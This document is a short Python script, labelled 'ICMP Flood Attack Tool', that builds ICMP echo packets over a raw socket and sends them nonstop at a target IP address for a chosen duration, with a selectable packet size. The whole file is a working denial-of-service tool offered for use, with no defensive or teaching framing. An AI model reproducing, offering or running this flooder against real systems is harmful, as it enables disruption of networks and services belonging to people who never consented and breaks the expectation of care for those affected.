import argparse
import socket
import struct
import sys
import time
import logging

def icmp_flood(target_ip, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    timeout = time.time() + duration

    while time.time() < timeout:
        try:
            packet = create_icmp_packet(packet_size)
            sock.sendto(packet, (target_ip, 0))
        except Exception as e:
            logging.error(f"Error sending ICMP packet: {e}")

def create_icmp_packet(packet_size):
    header = struct.pack('!BBHHH', 8, 0, 0, 100, 1)
    data = b'A' * packet_size  # Используем 'A' как данные пакета
    cksum = calculate_checksum(header + data)
    header = struct.pack('!BBHHH', 8, 0, cksum, 100, 1)
    return header + data

def calculate_checksum(data):
    checksum = 0
    count_to = (len(data) // 2) * 2

    for count in range(0, count_to, 2):
        this_val = data[count + 1] * 256 + data[count]
        checksum += this_val
        checksum &= 0xffffffff

    if count_to < len(data):
        checksum += data[count_to]
        checksum &= 0xffffffff

    checksum = (checksum >> 16) + (checksum & 0xffff)
    checksum += (checksum >> 16)
    checksum = ~checksum
    checksum &= 0xffff
    checksum = checksum >> 8 | (checksum << 8 & 0xff00)

    return checksum

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='ICMP Flood Attack Tool')
    parser.add_argument('target_ip', type=str, help='Target IP address')
    parser.add_argument('duration', type=int, help='Attack duration in seconds')
    parser.add_argument('--packet-size', type=int, default=64, help='Size of ICMP packets in bytes (default: 64)')

    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    try:
        icmp_flood(args.target_ip, args.duration, args.packet_size)
    except KeyboardInterrupt:
        logging.info("Attack interrupted by user.")
    except Exception as e:
        logging.error(f"An error occurred: {e}")